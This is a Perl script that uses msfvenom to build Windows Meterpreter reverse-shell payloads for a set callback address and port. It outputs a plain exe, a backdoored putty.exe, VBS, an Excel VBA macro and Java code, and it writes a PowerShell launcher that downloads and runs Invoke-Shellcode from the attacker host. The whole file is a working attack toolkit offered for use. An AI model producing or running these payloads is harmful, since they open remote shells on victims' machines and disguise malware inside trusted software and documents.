#!/usr/bin/perl
use strict;
use warnings;

  my($fileNdx, $LHOST, $LPORT, $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder);

  $targetFolder="/tmp/Meterpreters";
  $LHOST='169.254.70.157';
  $LPORT='443'; 
  $IoE="I";#Denote file as intended for internal or external use
  $fileNdx=0;
  $payload = '-p windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $commandControl = "lhost=$LHOST lport=$LPORT";
  $encoder = "-e generic/none";
#  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  print "If you want a clean slate, manually delete all files in $targetFolder\n\n";
  
  print "*** Most Basic Meterpreter\n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > ${currentFileName}.exe`;


  print "*** Meterpreter packed into putty \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > ${currentFileName}-putty.exe`;

  print "*** Meterpreter vbs  (Download and pass as arg to cscript) \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > ${currentFileName}.vbs`;


  print "Copy the Invoke-shellcode.ps1 to the target directory\n";
  my ($ShellCodePath) ="/usr/share/PowerSploit/CodeExecution/Invoke--Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/Invoke-Shellcode.ps1`;

  print "Creating the ps1 launch file (run set-ExecutionPolicy unrestricted as admin if needed)\n";
  $currentFileName = &getNextFileName();
  `echo \"IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-Shellcode.ps1');\" > $currentFileName.ps1`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $currentFileName.ps1`;

  print "*** Meterpreter vba  (Paste into Excel Macro) \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > ${currentFileName}.vba`;

  print "*** Meterpreter Java  (Paste into Java and compile) \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;



sub getNextFileName(){
  return sprintf('%s/%03d-Stalwart-%sCC-Meterpreter',$targetFolder, ++$fileNdx,${IoE});
}



